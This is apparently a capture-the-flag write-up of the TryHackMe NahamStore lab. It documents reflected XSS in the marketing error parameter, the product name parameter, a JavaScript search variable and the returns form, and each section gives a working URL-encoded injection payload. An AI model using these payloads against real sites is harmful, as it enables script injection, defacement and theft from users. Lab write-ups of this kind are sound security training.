# RECON





# XSS

# `http://marketing.nahamstore.thm/?error=`
- Go to (http://marketing.nahamstor.thm)
- It has two links redirects.

```html
  <td>Pre Opening Interest</td>
  <td>12/10/2020 18:23</td>
  <td class="text-center"><a href="/8d1952ba2b3c6dcd76236f090ab8642c" target="_blank"><span class="glyphicon glyphicon-new-window"></span></a></td>
</tr>
<tr>
  <td>Hoodie Giveaway</td>
  <td>12/15/2020 10:16</td>
  <td class="text-center"><a href="/09c2afcff60bb4dd3af7c5c5d74a482f" target="_blank"><span class="glyphicon glyphicon-new-window"></span></a></td>
```

- Edited the link to `/8d1952ba2b3c6dcd76236f090ab8642r`, i.e., changed last alphabet of the of redirect and got a new page `http://marketing.nahamstore.thm/?error=Not+Found`
- We can XSS in the `error` parameter, because same text is used in the web-page as `Not Found`, which can be confirmed by editing the parameter.
- We need to escape the `<p>` tag and inject are code

```html
<div class="alert alert-danger text-center" style="margin:0 100px 0 100px">
  <p>Not Found</p>
</div>

```

- I escaped `<div>` tags also just for fun
- **URL** - (http://marketing.nahamstore.thm/?error=XSS%3C%2Fp%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3C%2Fdiv%3E%3Ch1+style%3D%22color%3Ared%3Btext-align%3Acenter%22%3EPWNED%3C%2Fh1%3E) 

![screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/15.png)

## `http://nahamstore.thm/product?id=1&name=Hoodie+%2B+Tee`
- Edited name tag to `random`, and the title changed to `random`.

```html
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>NahamStore - random</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
</head>
```

- We can escape `</title>` tag and the code will be fine.
- Made a get request to (http://nahamstore.thm/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(%22PWNED%22)%3C/script%3E) and got an alert `PWNED`

![screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/16.png)

## `http://nahamstore.thm/search?q=`
- There is a Javascript XSS on the page, we can escape parenthesis with `' +` and write are command and end it with `+ '`

```javascript
var search = 'random';
    $.get('/search-products?q=' + search,function(resp){
        if( resp.length == 0 ){

            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');

        }else {
            $.each(resp, function (a, b) {
                $('.product-list').append('<div class="col-md-4">' +
                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
                    '</div>' +
                    '</div>');
            });
        }
    });
```

- Made a request as `http://nahamstore.thm/search?q=%27%2B%20alert(%22PWNED%22)%20%2B%27` and got a alert (we cannot use `+` directly because it stands for <SPACE> in URL, so user `%2B` instead.)

![Screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/18.png)

## `http://nahamstore.thm/returns`

- First need to place an order so made an account, signed in, and ordered an item, and noted the ordered id for future reference.
- Went to `http://nahamstore.thm/returns` ,entered the id we got earlier and created the return. 

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/19.png)

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/20.png)

- On the confirmation page we can see that same `Random Text` is inside a `textbox`. We can escape the tag `textbox` and make Cross Site Scripting(`XSS`)
- Made an attempt to alert `PWNED`

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/21.png)

- Got an alert

![alt](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/22.png)
